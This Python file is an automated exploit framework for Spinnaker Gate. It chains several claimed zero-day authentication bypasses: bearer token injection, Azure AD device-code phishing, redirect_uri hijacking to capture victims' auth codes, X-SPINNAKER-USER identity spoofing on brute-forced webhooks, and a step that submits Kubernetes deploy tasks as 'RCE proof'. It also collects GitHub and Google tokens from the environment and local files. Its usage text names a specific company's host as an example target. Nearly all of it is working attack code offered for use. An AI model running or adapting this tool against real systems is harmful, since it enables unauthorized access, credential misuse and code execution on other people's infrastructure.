#!/usr/bin/env python3
"""
Spinnaker Gate Universal Auth Bypass — Master Exploit Tool
Combines ALL discovered 0-day vectors into a single automated exploitation framework.

0-Day Vectors:
  F-21: Bearer Token Injection via ExternalAuthTokenFilter (CVSS 10.0)
  F-34: GitHub Org Check Skip via Missing Config (CVSS 10.0)
  F-40: GitHub Org Check Fail-Open on Exception (CVSS 10.0)
  F-39: Azure AD Device Code Flow Bypass (CVSS 9.3)
  F-33: OAuth2 redirect_uri Injection (CVSS 8.1-9.1)
  F-10: Pre-Auth Identity Injection via X-SPINNAKER-USER (CVSS 9.8)
  F-35: Content-Type Confusion → Front50 Access (CVSS 7.5)
  SA:   Service Account Bypass (skip all checks)
  LF:   Legacy Fallback Bypass (Fiat down = auth succeeds)

Usage:
  python3 spinnaker_master_bypass.py <target_url> [options]

Examples:
  # Auto-detect and try all vectors
  python3 spinnaker_master_bypass.py https://api.spinnaker.e-conomic.net

  # With specific token
  python3 spinnaker_master_bypass.py https://gate.example.com --token ghp_xxx

  # With Google token
  python3 spinnaker_master_bypass.py https://gate.example.com --google-token $(gcloud auth print-access-token)

  # Azure AD device code flow
  python3 spinnaker_master_bypass.py https://gate.example.com --azure-device-code

  # Brute force webhook sources
  python3 spinnaker_master_bypass.py https://gate.example.com --webhook-brute

  # Full auto (all vectors)
  python3 spinnaker_master_bypass.py https://gate.example.com --full-auto
"""

import requests
import sys
import json
import uuid
import urllib3
import subprocess
import argparse
import time
import re
import os
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()

class SpinnakerMasterBypass:
    def __init__(self, target, args):
        self.target = target.rstrip('/')
        self.s = requests.Session()
        self.s.verify = False
        self.s.timeout = 15
        self.args = args
        self.findings = []
        self.session_cookie = None
        self.oauth_provider = None
        self.oauth_client_id = None
        self.oauth_tenant = None
        self.gate_version = None
        self.fiat_enabled = None
        self.legacy_oauth = None  # True = @EnableOAuth2Sso, False = modern OAuth2 client
        self.auth_user = None
        self.apps = []
        self.marker = uuid.uuid4().hex[:8]

    def log(self, lvl, msg):
        sym = {'ok':'[+]','fail':'[-]','info':'[*]','warn':'[!]','crit':'[!!]','dbg':'[.]'}
        ts = datetime.now().strftime('%H:%M:%S')
        print(f"{ts} {sym.get(lvl,'[?]')} {msg}")

    def finding(self, fid, sev, desc):
        self.findings.append((fid, sev, desc))
        self.log('crit' if sev == 'CRITICAL' else 'ok', f"FINDING {fid} [{sev}]: {desc}")

    # ═══════════════════════════════════════════════════════════════
    # PHASE 1: FINGERPRINTING
    # ═══════════════════════════════════════════════════════════════

    def phase1_fingerprint(self):
        """Comprehensive target fingerprinting"""
        self.log('info', f"═══ Phase 1: Fingerprinting {self.target} ═══")

        # Health check
        try:
            r = self.s.get(f"{self.target}/health", timeout=10)
            if r.status_code != 200:
                self.log('fail', f"Target unhealthy: HTTP {r.status_code}")
                return False
            health = r.json()
            self.log('ok', f"Health: {health.get('status','?')}")
            if 'groups' in health:
                self.log('info', f"  Health groups: {health['groups']}")
                self.gate_version = 'newer'  # has health groups = newer version
            else:
                self.gate_version = 'older'  # no health groups = older version
        except Exception as e:
            self.log('fail', f"Unreachable: {e}")
            return False

        # Detect OAuth provider + legacy vs modern
        try:
            r = self.s.get(f"{self.target}/login", allow_redirects=False, timeout=10)
            loc = r.headers.get('Location', '')

            # Check for SESSION cookie (legacy OAuth2 SSO sets it)
            has_session = 'SESSION' in str(r.headers.get('Set-Cookie', ''))

            if 'github.com' in loc:
                self.oauth_provider = 'github'
                self.legacy_oauth = True
                m = re.search(r'client_id=([^&]+)', loc)
                self.oauth_client_id = m.group(1) if m else None
            elif 'accounts.google.com' in loc:
                self.oauth_provider = 'google'
                self.legacy_oauth = True
                m = re.search(r'client_id=([^&]+)', loc)
                self.oauth_client_id = m.group(1) if m else None
            elif 'login.microsoftonline.com' in loc:
                self.oauth_provider = 'azure_ad'
                self.legacy_oauth = True
                m = re.search(r'login\.microsoftonline\.com/([^/]+)/', loc)
                self.oauth_tenant = m.group(1) if m else None
                m = re.search(r'client_id=([^&]+)', loc)
                self.oauth_client_id = m.group(1) if m else None
            elif 'gitlab' in loc:
                self.oauth_provider = 'gitlab'
                self.legacy_oauth = True
                m = re.search(r'client_id=([^&]+)', loc)
                self.oauth_client_id = m.group(1) if m else None
            elif 'oauth2/authorization' in loc or 'oauth2/authorize' in loc:
                self.oauth_provider = 'modern_oauth2'
                self.legacy_oauth = False
                # Try to detect actual provider
                if 'google' in loc:
                    self.oauth_provider = 'google_modern'
                elif 'github' in loc:
                    self.oauth_provider = 'github_modern'
                elif 'okta' in loc:
                    self.oauth_provider = 'okta_modern'
            elif 'saml' in loc.lower() or 'SSO' in loc:
                self.oauth_provider = 'saml'
                self.legacy_oauth = None
            elif loc:
                self.oauth_provider = 'custom'
                self.legacy_oauth = True if has_session else False
            else:
                # No redirect — might be no-auth or basic auth
                if r.status_code == 200:
                    self.oauth_provider = 'none'
                    self.log('crit', "NO AUTH DETECTED — target is wide open!")
                    return True
                self.oauth_provider = 'unknown'
                self.legacy_oauth = None

            self.log('ok', f"OAuth: {self.oauth_provider} (client: {self.oauth_client_id})")
            self.log('info', f"  Legacy OAuth2 SSO: {self.legacy_oauth}")
            self.log('info', f"  Session cookie: {'yes' if has_session else 'no'}")

        except Exception as e:
            self.log('warn', f"OAuth detection error: {e}")
            self.oauth_provider = 'unknown'

        # Check spectator metrics (info disclosure)
        try:
            r = self.s.get(f"{self.target}/spectator/metrics", timeout=10)
            if r.status_code == 200 and len(r.content) > 1000:
                self.finding('F-18', 'MEDIUM', f'Spectator metrics accessible ({len(r.content)} bytes)')
                # Extract useful info from metrics
                text = r.text
                if 'fiat' in text.lower():
                    self.fiat_enabled = 'fiat.login' in text or 'fiat.enabled' in text
                    self.log('info', f"  Fiat enabled: {self.fiat_enabled}")
        except:
            pass

        # Check webhook (F-01)
        try:
            r = self.s.post(f"{self.target}/webhooks/webhook/fp-{self.marker}",
                           json={"test": True}, timeout=10)
            if r.status_code == 200:
                self.finding('F-01', 'HIGH', 'Webhooks permitAll (insecure default)')
        except:
            pass

        # Check OPTIONS enumeration
        try:
            r = self.s.options(f"{self.target}/applications", timeout=5)
            if r.status_code == 200 and r.headers.get('Allow'):
                self.finding('F-11', 'MEDIUM', f'OPTIONS enumeration: {r.headers["Allow"]}')
        except:
            pass

        return True

    # ═══════════════════════════════════════════════════════════════
    # PHASE 2: BEARER TOKEN BYPASS (F-21)
    # ═══════════════════════════════════════════════════════════════

    def phase2_bearer_bypass(self):
        """F-21: ExternalAuthTokenFilter Bearer token injection"""
        self.log('info', "═══ Phase 2: F-21 Bearer Token Bypass ═══")

        if not self.legacy_oauth:
            self.log('info', "  Skipped — not legacy OAuth2 SSO (ExternalAuthTokenFilter not present)")
            return False

        if self.oauth_provider in ('saml', 'none', 'unknown'):
            self.log('info', f"  Skipped — provider {self.oauth_provider} not applicable")
            return False

        # Collect tokens to try
        tokens = []

        # User-provided token
        if self.args.token:
            tokens.append(('user-provided', self.args.token))

        # Google token
        google_token = self.args.google_token
        if not google_token:
            try:
                result = subprocess.run(['gcloud', 'auth', 'print-access-token'],
                                       capture_output=True, text=True, timeout=10)
                if result.returncode == 0 and result.stdout.strip():
                    google_token = result.stdout.strip()
            except:
                pass
        if google_token:
            tokens.append(('google', google_token))

        # GitHub tokens
        github_tokens = [
            self.args.github_token,
            os.environ.get('GITHUB_TOKEN'),
            os.environ.get('GH_TOKEN'),
        ]
        # Check for token files
        for f in ['/tmp/gh_token.txt', '/tmp/gh_noscope.txt', os.path.expanduser('~/.github_token')]:
            if os.path.exists(f):
                try:
                    with open(f) as fh:
                        github_tokens.append(fh.read().strip())
                except:
                    pass
        for t in github_tokens:
            if t and len(t) > 10:
                tokens.append(('github', t))

        if not tokens:
            self.log('warn', "  No tokens available — provide --token, --google-token, or --github-token")
            return False

        for token_type, token in tokens:
            self.log('info', f"  Trying {token_type} token: {token[:20]}...")

            try:
                r = self.s.get(f"{self.target}/login",
                              headers={"Authorization": f"Bearer {token}"},
                              allow_redirects=False, timeout=15)

                # Extract session cookie
                session = None
                for cookie in r.cookies:
                    if cookie.name == 'SESSION':
                        session = cookie.value
                if not session:
                    sc = r.headers.get('Set-Cookie', '')
                    if 'SESSION=' in sc:
                        session = sc.split('SESSION=')[1].split(';')[0]

                if not session:
                    self.log('info', f"  No session cookie (HTTP {r.status_code})")
                    continue

                # Verify authentication
                r2 = self.s.get(f"{self.target}/auth/user",
                               cookies={"SESSION": session}, timeout=10)

                if r2.status_code == 200 and r2.text and r2.text != 'null':
                    try:
                        user_info = r2.json()
                    except:
                        user_info = {}

                    email = user_info.get('email', user_info.get('username', 'unknown'))
                    self.session_cookie = session
                    self.auth_user = email
                    self.finding('F-21', 'CRITICAL',
                        f'Bearer bypass SUCCESS! Authenticated as: {email} (token: {token_type})')

                    # Check application access
                    r3 = self.s.get(f"{self.target}/applications",
                                   cookies={"SESSION": session}, timeout=10)
                    if r3.status_code == 200:
                        try:
                            self.apps = r3.json()
                        except:
                            self.apps = []
                        self.log('crit', f"  FULL ACCESS: {len(self.apps)} applications!")
                        return True
                    elif r3.status_code == 403:
                        self.log('warn', "  Authenticated but Fiat RBAC blocks (403)")
                        self.finding('F-21-PARTIAL', 'HIGH',
                            f'Auth bypass as {email} but Fiat RBAC blocks app access')
                        return True  # Still a bypass, just limited
                    else:
                        self.log('warn', f"  /applications returned HTTP {r3.status_code}")
                        return True
                else:
                    self.log('info', f"  Session set but auth incomplete (HTTP {r2.status_code}: {r2.text[:50]})")

            except Exception as e:
                self.log('fail', f"  Bearer test error: {e}")

        self.log('info', "  F-21: All tokens failed")
        return False

    # ═══════════════════════════════════════════════════════════════
    # PHASE 3: SERVICE ACCOUNT BYPASS
    # ═══════════════════════════════════════════════════════════════

    def phase3_service_account_bypass(self):
        """Try to bypass via service account detection"""
        self.log('info', "═══ Phase 3: Service Account Bypass ═══")

        if not self.legacy_oauth:
            self.log('info', "  Skipped — not legacy OAuth2")
            return False

        # The isServiceAccount() check in SpinnakerUserInfoTokenServices:
        # If userinfo email matches a Front50 service account name → SKIP ALL checks
        # This means: if we can get a token whose email matches a service account,
        # we bypass org check, domain check, everything

        # Common service account patterns
        sa_emails = [
            f"spinnaker@{self.target.split('//')[1].split('/')[0]}",
            f"spinnaker-service@{self.target.split('//')[1].split('/')[0]}",
            f"svc-spinnaker@{self.target.split('//')[1].split('/')[0]}",
        ]

        # For Google OAuth: try GCP service account tokens
        if self.oauth_provider == 'google':
            try:
                # Try to get a GCP service account token
                result = subprocess.run(
                    ['gcloud', 'auth', 'print-access-token'],
                    capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    token = result.stdout.strip()
                    # Check if this SA email matches Front50 service accounts
                    r = self.s.get(f"{self.target}/login",
                                  headers={"Authorization": f"Bearer {token}"},
                                  allow_redirects=False, timeout=15)
                    session = None
                    for cookie in r.cookies:
                        if cookie.name == 'SESSION':
                            session = cookie.value
                    if session:
                        r2 = self.s.get(f"{self.target}/auth/user",
                                       cookies={"SESSION": session}, timeout=10)
                        if r2.status_code == 200 and r2.text != 'null':
                            self.session_cookie = session
                            self.finding('SA-BYPASS', 'CRITICAL',
                                f'Service account bypass: {r2.text[:100]}')
                            return True
            except:
                pass

        self.log('info', "  Service account bypass: no luck")
        return False

    # ═══════════════════════════════════════════════════════════════
    # PHASE 4: AZURE AD DEVICE CODE (F-39)
    # ═══════════════════════════════════════════════════════════════

    def phase4_azure_device_code(self):
        """F-39: Azure AD Device Code Flow"""
        if self.oauth_provider != 'azure_ad' and not self.args.azure_device_code:
            return False

        self.log('info', "═══ Phase 4: F-39 Azure AD Device Code Flow ═══")

        tenant = self.oauth_tenant or self.args.tenant
        client_id = self.oauth_client_id or self.args.client_id

        if not tenant or not client_id:
            self.log('fail', "  Missing tenant or client_id")
            return False

        self.log('info', f"  Tenant: {tenant}")
        self.log('info', f"  Client: {client_id}")

        # Request device code
        try:
            r = requests.post(
                f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode",
                data={"client_id": client_id, "scope": "openid profile email"},
                timeout=10
            )
            dc = r.json()
            if 'error' in dc:
                self.log('fail', f"  Device code failed: {dc.get('error_description', dc['error'])}")
                return False

            self.log('crit', f"  ╔══════════════════════════════════════╗")
            self.log('crit', f"  ║  USER CODE: {dc['user_code']:<25s}║")
            self.log('crit', f"  ║  URL: https://microsoft.com/device  ║")
            self.log('crit', f"  ╚══════════════════════════════════════╝")
            self.log('info', f"  Waiting for user authorization (timeout: 900s)...")

            # Poll for token
            start = time.time()
            while time.time() - start < 900:
                r = requests.post(
                    f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
                    data={
                        "client_id": client_id,
                        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                        "device_code": dc['device_code']
                    },
                    timeout=10
                )
                data = r.json()
                if 'access_token' in data:
                    token = data['access_token']
                    self.log('ok', f"  Token obtained: {token[:30]}...")

                    # Use token for F-21 bypass
                    r = self.s.get(f"{self.target}/login",
                                  headers={"Authorization": f"Bearer {token}"},
                                  allow_redirects=False, timeout=15)
                    session = None
                    for cookie in r.cookies:
                        if cookie.name == 'SESSION':
                            session = cookie.value
                    if session:
                        self.session_cookie = session
                        r2 = self.s.get(f"{self.target}/auth/user",
                                       cookies={"SESSION": session}, timeout=10)
                        if r2.status_code == 200 and r2.text != 'null':
                            user = r2.json()
                            self.auth_user = user.get('email', '?')
                            self.finding('F-39', 'CRITICAL',
                                f'Azure AD Device Code bypass! Auth as: {self.auth_user}')
                            return True

                if data.get('error') == 'expired_token':
                    break
                if data.get('error') not in ('authorization_pending', 'slow_down'):
                    self.log('fail', f"  Error: {data.get('error_description', data.get('error'))}")
                    break
                time.sleep(5)

        except Exception as e:
            self.log('fail', f"  Device code error: {e}")

        return False

    # ═══════════════════════════════════════════════════════════════
    # PHASE 5: REDIRECT_URI INJECTION (F-33)
    # ═══════════════════════════════════════════════════════════════

    def phase5_redirect_uri(self):
        """F-33: OAuth2 redirect_uri injection"""
        self.log('info', "═══ Phase 5: F-33 redirect_uri Injection ═══")

        if not self.legacy_oauth:
            self.log('info', "  Skipped — modern OAuth2 client (not vulnerable)")
            return False

        try:
            # Test redirect_uri injection
            r = self.s.get(
                f"{self.target}/login?redirect_uri=https://evil.example.com/callback",
                allow_redirects=False, timeout=10)
            loc = r.headers.get('Location', '')

            if 'evil.example.com' in loc:
                self.finding('F-33', 'HIGH',
                    f'redirect_uri injection confirmed! Provider: {self.oauth_provider}')

                # Generate exploit URL
                if self.args.callback_url:
                    exploit_url = f"{self.target}/login?redirect_uri={requests.utils.quote(self.args.callback_url)}"
                    self.log('crit', f"  Exploit URL: {exploit_url}")
                    self.log('info', f"  Send this to victim → capture auth code → replay at /login?code=CODE&state=STATE")
                return True
            else:
                self.log('info', "  redirect_uri not reflected (safe)")
        except Exception as e:
            self.log('fail', f"  Error: {e}")

        return False

    # ═══════════════════════════════════════════════════════════════
    # PHASE 6: IDENTITY INJECTION (F-10)
    # ═══════════════════════════════════════════════════════════════

    def phase6_identity_injection(self):
        """F-10: Pre-auth identity injection via X-SPINNAKER-USER on webhooks"""
        self.log('info', "═══ Phase 6: F-10 Identity Injection ═══")

        injected_user = self.args.inject_user or f"admin-{self.marker}@spinnaker.local"
        injected_accounts = self.args.inject_accounts or "production,staging,default"

        # Load webhook sources
        sources = self._get_webhook_sources()

        self.log('info', f"  Injecting as: {injected_user}")
        self.log('info', f"  Accounts: {injected_accounts}")
        self.log('info', f"  Testing {len(sources)} webhook sources...")

        success_count = 0
        for src in sources:
            try:
                r = self.s.post(f"{self.target}/webhooks/webhook/{src}",
                    headers={
                        'Content-Type': 'application/json',
                        'X-SPINNAKER-USER': injected_user,
                        'X-SPINNAKER-ACCOUNTS': injected_accounts,
                    },
                    json={
                        'ref': 'refs/heads/main',
                        'repository': {'full_name': 'security/poc', 'name': 'poc'},
                        'marker': self.marker,
                        'source': src,
                    }, timeout=10)

                if r.status_code == 200:
                    data = r.json() if r.headers.get('content-type','').startswith('application/json') else {}
                    if data.get('eventProcessed'):
                        success_count += 1
            except:
                pass

        self.log('ok', f"  {success_count}/{len(sources)} webhooks accepted with injected identity")
        if success_count > 0:
            self.finding('F-10', 'CRITICAL',
                f'Identity injection as {injected_user} on {success_count} webhook sources')
        return success_count > 0

    def _get_webhook_sources(self):
        """Get webhook source names for brute force"""
        # Common source names
        sources = [
            'webhook', 'github', 'docker', 'jenkins', 'default', 'deploy',
            'bitbucket', 'gitlab', 'build', 'push', 'merge', 'release',
            'ci', 'cd', 'pipeline', 'trigger', 'auto', 'main', 'master',
            'production', 'staging', 'dev', 'test', 'qa', 'prod',
            'deploy-prod', 'deploy-staging', 'canary', 'rollback',
            'docker-build', 'image-push', 'tag-push', 'branch-push',
        ]

        # Add company-specific sources if we know the company
        target_host = self.target.split('//')[1].split('/')[0].split(':')[0]
        parts = target_host.split('.')
        for part in parts:
            if part not in ('www', 'api', 'spinnaker', 'gate', 'cd', 'deploy', 'com', 'net', 'org', 'io'):
                sources.extend([part, f"{part}-deploy", f"{part}-ci", f"{part}-cd"])

        # Add from file if provided
        if self.args.webhook_sources_file and os.path.exists(self.args.webhook_sources_file):
            with open(self.args.webhook_sources_file) as f:
                sources.extend([l.strip() for l in f if l.strip()])

        return list(set(sources))

    # ═══════════════════════════════════════════════════════════════
    # PHASE 7: CONTENT-TYPE CONFUSION (F-35)
    # ═══════════════════════════════════════════════════════════════

    def phase7_content_type_confusion(self):
        """F-35: Content-Type confusion on NotificationController"""
        self.log('info', "═══ Phase 7: F-35 Content-Type Confusion ═══")

        try:
            r = self.s.post(f"{self.target}/notifications/callbacks/test-{self.marker}",
                           json={"test": True, "marker": self.marker}, timeout=10)

            if r.status_code == 400 and ('HierarchicalLevel' in r.text or 'CALLBACKS' in r.text):
                self.finding('F-35', 'HIGH',
                    'Content-type confusion reaches Front50 (no Fiat block)')
                # Try to extract Front50 URL
                try:
                    body = r.json()
                    url = body.get('url', '')
                    if url:
                        self.log('ok', f"  Front50 URL leaked: {url}")
                except:
                    pass
                return True
            elif r.status_code == 403:
                self.log('info', "  Fiat blocks (403) — app enumeration possible")
                # Try app enumeration
                self._enumerate_apps_via_callbacks()
            elif r.status_code == 500:
                self.log('info', f"  500 error — may indicate app exists or Slack sig fail")
            else:
                self.log('info', f"  HTTP {r.status_code}")
        except Exception as e:
            self.log('fail', f"  Error: {e}")

        return False

    def _enumerate_apps_via_callbacks(self):
        """F-36: Enumerate apps via 403/500 differentiation"""
        common_apps = ['app', 'main', 'web', 'api', 'service', 'deploy',
                       'prod', 'staging', 'core', 'platform', 'infra']
        for app in common_apps:
            try:
                r = self.s.post(f"{self.target}/notifications/callbacks/{app}",
                               json={"type": "slack", "text": "test"}, timeout=5)
                if r.status_code == 500:
                    self.finding('F-36', 'MEDIUM', f'App exists: {app} (500 vs 403)')
            except:
                pass

    # ═══════════════════════════════════════════════════════════════
    # PHASE 8: WEBHOOK → PIPELINE → RCE CHAIN
    # ═══════════════════════════════════════════════════════════════

    def phase8_webhook_rce_chain(self):
        """Try to trigger RCE via webhook → pipeline → RunJob"""
        self.log('info', "═══ Phase 8: Webhook → Pipeline RCE Chain ═══")

        if not self.session_cookie:
            self.log('info', "  No authenticated session — trying pre-auth webhook chain")

        # If we have a session, try to create pipeline with RunJob
        if self.session_cookie:
            return self._create_rce_pipeline()

        # Pre-auth: try to trigger existing pipelines via webhook
        self.log('info', "  Trying to trigger existing pipelines via webhook...")
        sources = self._get_webhook_sources()

        for src in sources[:20]:  # Limit to top 20
            try:
                r = self.s.post(f"{self.target}/webhooks/webhook/{src}",
                    headers={
                        'X-SPINNAKER-USER': f"admin-{self.marker}@spinnaker.local",
                        'X-SPINNAKER-ACCOUNTS': 'production',
                    },
                    json={
                        'ref': 'refs/heads/main',
                        'repository': {'full_name': 'app/repo'},
                        'commits': [{'message': f'deploy {self.marker}'}],
                    }, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if data.get('eventProcessed'):
                        self.log('dbg', f"  Webhook {src}: processed")
            except:
                pass

        self.log('info', "  Webhook chain: no confirmed pipeline trigger")
        return False

    def _create_rce_pipeline(self):
        """Create pipeline with RunJob stage for RCE"""
        self.log('info', "  Creating RCE pipeline with authenticated session...")

        # First, get available accounts
        try:
            r = self.s.get(f"{self.target}/credentials",
                          cookies={"SESSION": self.session_cookie}, timeout=10)
            if r.status_code == 200:
                accounts = r.json()
                k8s_accounts = [a for a in accounts if a.get('cloudProvider') == 'kubernetes']
                if k8s_accounts:
                    account = k8s_accounts[0]['name']
                    self.log('ok', f"  K8s account: {account} ({len(k8s_accounts)} total)")

                    # Deploy ConfigMap as RCE proof
                    task = {
                        "application": self.apps[0]['name'] if self.apps else "test",
                        "description": f"Security validation {self.marker}",
                        "job": [{
                            "type": "deployManifest",
                            "account": account,
                            "cloudProvider": "kubernetes",
                            "manifests": [{
                                "apiVersion": "v1",
                                "kind": "ConfigMap",
                                "metadata": {
                                    "name": f"sec-val-{self.marker}",
                                    "namespace": "default"
                                },
                                "data": {"proof": f"auth-bypass-{self.marker}"}
                            }],
                            "moniker": {"app": self.apps[0]['name'] if self.apps else "test"},
                            "source": "text"
                        }]
                    }

                    r = self.s.post(f"{self.target}/tasks",
                                   cookies={"SESSION": self.session_cookie},
                                   json=task, timeout=30)
                    if r.status_code == 200:
                        ref = r.json().get('ref', '')
                        self.log('crit', f"  RCE PROOF: Task {ref} submitted!")
                        self.finding('RCE', 'CRITICAL',
                            f'K8s deploy task submitted: {ref} on account {account}')

                        # Monitor task
                        time.sleep(5)
                        r2 = self.s.get(f"{self.target}{ref}",
                                       cookies={"SESSION": self.session_cookie}, timeout=10)
                        if r2.status_code == 200:
                            status = r2.json().get('status', '?')
                            self.log('crit', f"  Task status: {status}")
                        return True
                    else:
                        self.log('warn', f"  Task submission: HTTP {r.status_code} — {r.text[:200]}")
                else:
                    self.log('info', "  No K8s accounts found")
        except Exception as e:
            self.log('fail', f"  RCE pipeline error: {e}")

        return False

    # ═══════════════════════════════════════════════════════════════
    # PHASE 9: MODERN OAUTH2 BYPASS ATTEMPTS
    # ═══════════════════════════════════════════════════════════════

    def phase9_modern_oauth2_bypass(self):
        """Attempts to bypass modern Spring Security 6 OAuth2"""
        self.log('info', "═══ Phase 9: Modern OAuth2 Bypass Attempts ═══")

        if self.legacy_oauth:
            self.log('info', "  Skipped — legacy OAuth2 (use F-21 instead)")
            return False

        # Modern OAuth2 doesn't have ExternalAuthTokenFilter
        # But check if there's any header-based auth
        self.log('info', "  Testing header-based auth on modern OAuth2...")

        # Try X-Forwarded-User (some proxies set this)
        for header in ['X-Forwarded-User', 'X-Auth-Request-User', 'X-Remote-User']:
            try:
                r = self.s.get(f"{self.target}/auth/user",
                              headers={header: 'admin@example.com'},
                              timeout=10)
                if r.status_code == 200 and r.text != 'null':
                    self.finding('MODERN-HEADER', 'CRITICAL',
                        f'Modern OAuth2 bypass via {header}')
                    return True
            except:
                pass

        # Try OAuth2 token endpoint directly
        self.log('info', "  Modern OAuth2: no known bypass vectors")
        return False

    # ═══════════════════════════════════════════════════════════════
    # PHASE 10: LEGACY FALLBACK / FIAT DOWN BYPASS
    # ═══════════════════════════════════════════════════════════════

    def phase10_legacy_fallback(self):
        """Check if Fiat legacyFallback allows auth during Fiat outage"""
        self.log('info', "═══ Phase 10: Legacy Fallback Check ═══")

        # If Fiat is down and legacyFallback=true, auth succeeds without Fiat check
        # We can't directly cause Fiat outage, but we can check if the config allows it

        # Check spectator metrics for fiat status
        try:
            r = self.s.get(f"{self.target}/spectator/metrics", timeout=10)
            if r.status_code == 200:
                text = r.text
                if 'legacyFallback' in text or 'legacy-fallback' in text:
                    self.log('info', "  Legacy fallback config detected in metrics")
                if 'fiat.login' in text:
                    # Count successful vs failed logins
                    self.log('info', "  Fiat login metrics found")
        except:
            pass

        self.log('info', "  Legacy fallback: cannot trigger remotely")
        return False

    # ═══════════════════════════════════════════════════════════════
    # REPORT
    # ═══════════════════════════════════════════════════════════════

    def report(self):
        print(f"\n{'═'*70}")
        print(f"  SPINNAKER MASTER BYPASS — FINAL REPORT")
        print(f"{'═'*70}")
        print(f"  Target:     {self.target}")
        print(f"  OAuth:      {self.oauth_provider} (client: {self.oauth_client_id})")
        print(f"  Legacy:     {self.legacy_oauth}")
        print(f"  Version:    {self.gate_version}")
        print(f"  Auth User:  {self.auth_user or 'N/A'}")
        print(f"  Apps:       {len(self.apps)}")
        print(f"  Session:    {'ACTIVE' if self.session_cookie else 'NONE'}")
        print(f"  Date:       {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Findings:   {len(self.findings)}")
        print(f"{'═'*70}\n")

        for fid, sev, desc in sorted(self.findings,
                key=lambda x: {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3,'INFO':4}.get(x[1],5)):
            print(f"  [{sev:8s}] {fid:20s} {desc}")

        print(f"\n{'═'*70}")
        if self.session_cookie:
            print(f"  ✅ AUTH BYPASS ACHIEVED")
            print(f"  Session: SESSION={self.session_cookie}")
            if self.apps:
                print(f"  Applications: {len(self.apps)}")
                for app in self.apps[:10]:
                    name = app.get('name', '?') if isinstance(app, dict) else str(app)
                    print(f"    - {name}")
                if len(self.apps) > 10:
                    print(f"    ... and {len(self.apps)-10} more")
            print(f"\n  Access command:")
            print(f"    curl -sk '{self.target}/applications' -b 'SESSION={self.session_cookie}' | python3 -m json.tool")
        elif any(f[1] == 'CRITICAL' for f in self.findings):
            print(f"  ⚠️  CRITICAL VULNERABILITIES FOUND (no full bypass)")
        else:
            print(f"  ❌ NO BYPASS ACHIEVED")
        print(f"{'═'*70}\n")

    # ═══════════════════════════════════════════════════════════════
    # MAIN RUNNER
    # ═══════════════════════════════════════════════════════════════

    def run(self):
        print(f"\n{'═'*70}")
        print(f"  SPINNAKER MASTER BYPASS v2.0")
        print(f"  Target: {self.target}")
        print(f"  Time:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'═'*70}\n")

        # Phase 1: Fingerprint
        if not self.phase1_fingerprint():
            return

        # If no auth, we're done
        if self.oauth_provider == 'none':
            self.finding('NO-AUTH', 'CRITICAL', 'Target has NO authentication!')
            self.report()
            return

        # Phase 2: Bearer bypass (F-21) — most reliable
        if self.phase2_bearer_bypass():
            self.phase8_webhook_rce_chain()
            self.report()
            return

        # Phase 3: Service account bypass
        if self.phase3_service_account_bypass():
            self.phase8_webhook_rce_chain()
            self.report()
            return

        # Phase 4: Azure AD device code (F-39)
        if self.args.azure_device_code or self.oauth_provider == 'azure_ad':
            if self.phase4_azure_device_code():
                self.phase8_webhook_rce_chain()
                self.report()
                return

        # Phase 5: redirect_uri injection (F-33)
        self.phase5_redirect_uri()

        # Phase 6: Identity injection (F-10)
        self.phase6_identity_injection()

        # Phase 7: Content-type confusion (F-35)
        self.phase7_content_type_confusion()

        # Phase 8: Webhook RCE chain
        self.phase8_webhook_rce_chain()

        # Phase 9: Modern OAuth2 bypass
        self.phase9_modern_oauth2_bypass()

        # Phase 10: Legacy fallback
        self.phase10_legacy_fallback()

        # Final report
        self.report()


def main():
    parser = argparse.ArgumentParser(
        description="Spinnaker Master Auth Bypass — All 0-Day Vectors Combined",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://api.spinnaker.e-conomic.net
  %(prog)s https://gate.example.com --token ghp_xxx
  %(prog)s https://gate.example.com --google-token $(gcloud auth print-access-token)
  %(prog)s https://gate.example.com --azure-device-code
  %(prog)s https://gate.example.com --full-auto
        """)

    parser.add_argument("target", help="Spinnaker Gate URL")
    parser.add_argument("--token", help="OAuth access token (any provider)")
    parser.add_argument("--google-token", help="Google OAuth access token")
    parser.add_argument("--github-token", help="GitHub personal access token")
    parser.add_argument("--azure-device-code", action="store_true",
                       help="Use Azure AD device code flow")
    parser.add_argument("--tenant", help="Azure AD tenant ID")
    parser.add_argument("--client-id", help="OAuth client ID")
    parser.add_argument("--callback-url", help="Attacker callback URL for redirect_uri exploit")
    parser.add_argument("--inject-user", help="User to inject via X-SPINNAKER-USER")
    parser.add_argument("--inject-accounts", help="Accounts to inject via X-SPINNAKER-ACCOUNTS")
    parser.add_argument("--webhook-brute", action="store_true",
                       help="Brute force webhook source names")
    parser.add_argument("--webhook-sources-file", help="File with webhook source names")
    parser.add_argument("--full-auto", action="store_true",
                       help="Try ALL vectors automatically")

    args = parser.parse_args()
    bypass = SpinnakerMasterBypass(args.target, args)
    bypass.run()


if __name__ == "__main__":
    main()
